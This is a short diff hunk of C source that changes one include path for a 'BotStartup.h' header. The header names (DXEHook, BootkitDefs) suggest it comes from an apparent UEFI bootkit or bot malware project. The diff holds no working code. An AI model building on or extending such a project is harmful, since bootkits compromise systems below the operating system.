@@ -1,6 +1,6 @@
 #include "DXEHook.h"
 #include "BootkitDefs.h"
-#include "../Bot/BotStartup.h"
+#include "../KernelMode/BotStartup.h"
 #include "../Shared/MemTools.h"
 
 #include <Library/BaseMemoryLib.h>
